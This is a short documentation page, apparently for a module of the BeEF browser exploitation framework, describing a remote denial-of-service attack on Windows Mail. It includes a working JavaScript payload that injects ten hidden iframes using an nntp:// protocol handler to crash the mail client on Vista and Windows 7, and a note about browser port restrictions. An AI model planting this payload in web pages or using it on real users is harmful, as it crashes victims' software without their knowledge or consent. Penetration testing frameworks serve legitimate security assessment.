## Summary

* **Objective**: Crash Windows Mail (on Vista and Win7 SP2) remotely
* **Authors**: bcoles
* **Browsers**: Firefox

* [Code](https://github.com/beefproject/beef/tree/master/modules/local_host/window_mail_client_dos)

## Internal Working

This module exploits an unhandled exception in Windows Mail to crash the client remotely.

Windows Mail is launched and then crashed if it is not already open. It comes installed by default on Windows Vista (but it's also vulnerable on Windows 7 SP2).

The protocol handler used will be nntp://

```js
var protocol_iframe;
for(var i=1;i<=10;i++) {
        protocol_iframe = document.createElement('iframe');
        protocol_iframe.setAttribute('src',   'nntp://127.0.0.1:119//');
        protocol_iframe.setAttribute('id',    'winmail'+i);
        protocol_iframe.setAttribute('style', 'display:none');
        winmail_container.contentWindow.document.body.appendChild(protocol_iframe);
}
```

## References

The port for NNTP (119) will be blocked in newer versions of Chrome and Firefox
https://e1tips.com/2014/03/17/allow-firefox-chrome-to-access-restricted-ports/


## Feedback

